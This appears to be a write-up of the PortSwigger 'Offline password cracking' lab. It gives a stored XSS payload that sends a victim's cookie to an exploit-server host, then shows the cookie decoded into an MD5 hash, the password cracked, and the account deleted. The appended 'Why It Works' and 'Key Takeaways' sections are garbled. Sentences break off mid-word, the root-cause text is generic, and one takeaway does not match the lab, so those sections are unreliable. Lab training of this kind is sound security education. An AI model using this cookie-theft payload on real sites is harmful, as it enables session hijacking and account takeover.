# Offline password cracking

1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
1. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows: `username+':'+md5HashOfPassword`
1. You now need to steal the victim user's cookie.
Observe that the comment functionality is vulnerable to XSS.
1. Go to the exploit server and make a note of the URL.
1. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID: `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
1. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
1. Decode the cookie in Burp Decoder. The result will be: `carlos:26323c16d5f4dabff3bb136f2460a943`
1. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
1. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.

### Note

The purpose of this lab is to demonstrate the potential of cracking passwords offline. Most likely, this would be done using a tool like hashcat, for example. When testing your clients' websites, we do not recommend submitting hashes of their real passwords in a search engine.

### Why It Works

The exploit succeeds because this lab stores the user's password hash in a cookie. the lab also contains an xss vulnerability in the comment functionality. to solve the lab, obtain carlos's stay-logged-in cookie and use it to cra

The official solution confirms: With Burp running, use your own account to investigate the &quot;Stay logged in&quot; functionality. Notice that the stay-logged-in cookie is Base64 e

The root cause is a failure in the application's security architecture specific to this authentication scenario — the server does not properly validate or secure the user-controlled input that reaches the vulnerable operation.

### Key Takeaways

- This lab contains XSS vulnerability, demonstrating how authentication vulnerabilities manifest in real applications.
- The vulnerability is exploitable because user input reaches a sensitive operation without adequate server-side validation.
- PortSwigger confirms: "This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in "
- Consistent error messages and rate-limiting prevent enumeration and brute-force.

## PortSwigger Lab

**Official lab:** Offline password cracking

**PortSwigger:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
